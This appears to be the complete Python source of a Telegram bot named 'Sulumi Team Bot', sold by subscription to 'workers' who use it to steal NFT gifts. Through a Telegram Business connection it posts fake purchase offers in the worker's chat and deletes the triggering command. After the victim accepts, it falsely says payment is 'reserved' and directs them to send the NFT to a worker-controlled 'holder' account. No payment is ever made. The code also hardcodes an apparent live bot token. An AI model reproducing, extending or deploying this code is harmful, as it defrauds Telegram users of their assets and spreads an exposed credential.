"""
Sulumi Team Bot — Final Clean Version
"""

import os, re, uuid, time, sqlite3, requests
from flask import Flask, request, jsonify

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
PAYMENT = os.environ.get("PAYMENT", "golda11123")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")

E = {
    "stars": "5958376256788502078", "grams": "6006074913742396956",
    "decline": "5778527486270770928", "accept": "5776375003280838798",
    "forward": "5832251986635920010", "check": "6019523512908124649"
}

def ce(name, fb): return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'
def btn(t, d, e): return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}
def btn_url(t, u, e): return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}

# БАЗА ДАННЫХ
DB = "sulumi.db"
def db_init():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS subs (uid INTEGER PRIMARY KEY, exp REAL)')
    c.execute('INSERT OR IGNORE INTO subs (uid, exp) VALUES (?, ?)', (OWNER_ID, -1))
    conn.commit()
    conn.close()

def db_check(uid):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT exp FROM subs WHERE uid=?', (uid,))
    r = c.fetchone()
    conn.close()
    return r and (r[0] == -1 or r[0] > time.time())

def db_add(uid, days):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    exp = -1.0 if days == -1 else time.time() + days * 86400
    c.execute('INSERT OR REPLACE INTO subs (uid, exp) VALUES (?, ?)', (uid, exp))
    conn.commit()
    conn.close()

def db_exp(uid):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT exp FROM subs WHERE uid=?', (uid,))
    r = c.fetchone()
    conn.close()
    if not r or r[0] == -1: return "Навсегда"
    return time.strftime("%d.%m.%Y", time.localtime(r[0]))

db_init()

deals, users, bconns = {}, {}, {}
wholder, wlang, wcur = set(), set(), set()

def api(m, **p):
    try:
        r = requests.post(f"{API}/{m}", json=p, timeout=30)
        return r.json()
    except: return {}

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, url, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML",
         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def em(cid, mid, txt, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def ac(cb, t=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if t: d["text"] = t
    return api("answerCallbackQuery", **d)

def okb(did):
    return {"inline_keyboard": [[btn("✕ Отклонить", f"decline:{did}", "decline"), btn("✓ Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    return {"inline_keyboard": [[btn_url("↗ Передать", f"tg://send_gift?to={h.replace('@','')}", "forward")], [btn("✓ Проверить", f"check:{did}", "check")]]}

def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
    return {"slug": s, "name": gn, "num": num, "nfmt": f"{int(num):,}".replace(",", " ")}

def gs(uid):
    if uid not in users: users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

@app.route("/webhook", methods=["POST"])
def webhook():
    u = request.json
    if not u: return jsonify({"ok": True})
    
    if "message" in u: handle_msg(u["message"])
    elif "business_message" in u: handle_msg(u["business_message"])
    elif "callback_query" in u: handle_cb(u["callback_query"])
    elif "business_connection" in u:
        bc = u["business_connection"]
        bconns[bc["user"]["id"]] = bc["id"]
    
    return jsonify({"ok": True})

def handle_msg(msg):
    try:
        cid = msg["chat"]["id"]
        uid = msg["from"]["id"]
        mid = msg["message_id"]
        ci = msg.get("business_connection_id")
        txt = (msg.get("text") or "").strip()
        
        if ci: bconns[uid] = ci
        
        # Режимы ожидания
        if uid in wholder:
            un = txt.lstrip("@").lower()
            if un and " " not in un:
                gs(uid)["hold"] = un
                wholder.discard(uid)
                sm(cid, f"✅ Держатель: @{un}", bci=ci)
            return
        
        if uid in wlang:
            if txt.lower() in ["ru", "en"]:
                gs(uid)["lang"] = txt.lower()
                wlang.discard(uid)
                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬🇧 EN'}", bci=ci)
            return
        
        if uid in wcur:
            if txt.lower() in ["stars", "grams"]:
                gs(uid)["cur"] = txt.lower()
                wcur.discard(uid)
                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else '💎'}", bci=ci)
            return
        
        # Обычные сообщения - игнор
        if not txt.startswith("/"): return
        
        # Проверка доступа
        if txt not in ["/start", "/tarifs", "/help"] and uid != OWNER_ID and not db_check(uid):
            sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
            return
        
        # КОМАНДЫ
        if txt == "/start":
            t = "✨ <b>Sulumi Team Bot</b>\n\n"
            t += "📋 <b>Как купить:</b>\n1. Зайди в ЛС к продавцу\n2. Напиши: <code>/send ссылка цена</code>\n\n"
            t += "📋 <b>Команды:</b>\n/tarifs — Цены\n/settings — Настройки\n/profile — Профиль"
            if uid == OWNER_ID: t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни>\n/list"
            sm(cid, t, bci=ci)
            return
        
        if txt == "/tarifs":
            sm(cid, f"💎 <b>Тарифы</b>\n\n1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON\n\n💳 @{PAYMENT}", bci=ci)
            return
        
        if txt == "/help":
            sm(cid, "❓ Напиши /send в ЛС продавцу", bci=ci)
            return
        
        if txt == "/profile":
            s = gs(uid)
            ce_ = ce('stars','⭐') if s['cur']=='stars' else ce('grams','💎')
            sm(cid, f" <b>Профиль</b>\n\nID: <code>{uid}</code>\nВалюта: {ce_}\nДержатель: @{s['hold']}\nДоступ: {db_exp(uid)}", bci=ci)
            return
        
        if txt == "/settings":
            s = gs(uid)
            sm(cid, f"⚙️ <b>Настройки</b>\n\nЯзык: {s['lang']}\nВалюта: {s['cur']}\nДержатель: @{s['hold']}\n\n/lg - язык\n/cv - валюта\n/holder - держатель", bci=ci)
            return
        
        if txt == "/lg":
            wlang.add(uid)
            sm(cid, "🌐 ru или en", bci=ci)
            return
        
        if txt == "/cv":
            wcur.add(uid)
            sm(cid, "💱 stars или grams", bci=ci)
            return
        
        if txt.startswith("/holder"):
            wholder.add(uid)
            sm(cid, "👑 Username без @", bci=ci)
            return
        
        if txt.startswith("/send"):
            parts = txt.split()
            if len(parts) < 3:
                sm(cid, "❌ /send ссылка цена", bci=ci)
                return
            
            ni = pnft(" ".join(parts[1:]))
            if not ni:
                sm(cid, " Не найдена NFT", bci=ci)
                return
            
            rest = " ".join(parts[1:]).replace(ni["slug"], "").strip()
            try: pr = int(rest.split()[0])
            except:
                sm(cid, "❌ Не указана цена", bci=ci)
                return
            
            s = gs(uid)
            cs = ce("stars","⭐") if s["cur"]=="stars" else ce("grams","💎")
            did = str(uuid.uuid4())[:8]
            
            # ВАЖНО: используем business_connection_id из этого сообщения
            bci_to_use = ci or bconns.get(uid)
            if not bci_to_use:
                sm(cid, "⚠️ Подключи бота: @BotFather → Business", bci=ci)
                return
            
            deals[did] = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
                         "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"],
                         "st": "pending", "bci": bci_to_use}
            
            nl = f"https://t.me/nft/{ni['slug']}"
            hidden = f'<a href="{nl}">\u200b</a>'
            name = msg['from'].get('first_name') or msg['from'].get('username') or "User"
            cap = hidden + f"<b>{name}</b> предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
            
            # Отправляем оффер
            res = sm_nft(cid, cap, nl, kb=okb(did), bci=bci_to_use)
            
            if res.get("ok"):
                # СРАЗУ удаляем команду
                print(f"Deleting message {mid} with bci={bci_to_use}")
                del_res = dm(cid, mid, bci=bci_to_use)
                if not del_res.get("ok"):
                    print(f"Delete failed: {del_res}")
                    # Фоллбэк - редактируем
                    em(cid, mid, "✅", bci=bci_to_use)
            return
        
        if txt.startswith("/add") and uid == OWNER_ID:
            parts = txt.split()
            if len(parts) >= 3:
                try:
                    tid, days = int(parts[1]), int(parts[2])
                    db_add(tid, days)
                    sm(cid, f"✅ Доступ {tid} на {days}д", bci=ci)
                except Exception as e:
                    sm(cid, f"❌ {e}", bci=ci)
            return
        
        if txt == "/list" and uid == OWNER_ID:
            conn = sqlite3.connect(DB)
            rows = conn.execute('SELECT uid, exp FROM subs').fetchall()
            conn.close()
            lst = "\n".join([f"• <code>{r[0]}</code> ({db_exp(r[0])})" for r in rows])
            sm(cid, f"📋 <b>Доступы</b>\n\n{lst}", bci=ci)
            return
        
    except Exception as e:
        print(f"MSG ERROR: {e}")
        import traceback
        traceback.print_exc()

def handle_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")
        
        ac(cbid)
        
        if data.startswith("check:"):
            ac(cbid, "🔍 Ищем...", sa=True)
            return
        
        if data.startswith("accept:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal or deal["st"] != "pending": return
            
            deal["st"] = "accepted"
            cs = ce("stars","⭐") if deal["cur"]=="stars" else ce("grams","💎")
            nf = f"{int(deal['num']):,}".replace(",", " ")
            h = deal["hold"]
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"<b>{deal['price']}</b> {cs} зарезервированы.\n\nОтправь <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажми «Передать»."
            
            res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML",
                     link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl},
                     reply_markup=aakb(did, h), business_connection_id=bci)
            
            if not res.get("ok"):
                dm(cid, mid, bci=bci)
                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
            return
        
        if data.startswith("decline:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            bci = deal.get("bci") or ci if deal else ci
            if deal: deal["st"] = "declined"
            em(cid, mid, "❌ Отклонено", bci=bci)
            return
        
    except Exception as e:
        print(f"CB ERROR: {e}")

@app.route("/")
def index():
    return "✅ OK"

def set_wh():
    url = f"{RENDER_URL}/webhook"
    r = api("setWebhook", url=url, allowed_updates=["message","callback_query","business_connection","business_message"])
    print(f"Webhook: {r}")

def set_cmd():
    cmds = [
        {"command": "start", "description": "📋 Меню"},
        {"command": "send", "description": "💎 Оффер"},
        {"command": "tarifs", "description": "💳 Цены"},
        {"command": "profile", "description": "👤 Профиль"},
        {"command": "settings", "description": "️ Настройки"},
        {"command": "lg", "description": "🌐 Язык"},
        {"command": "cv", "description": "💱 Валюта"}
    ]
    api("setMyCommands", commands=cmds)
    print("Commands set")

if __name__ == "__main__":
    set_wh()
    set_cmd()
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting on {port}")
    app.run(host="0.0.0.0", port=port)
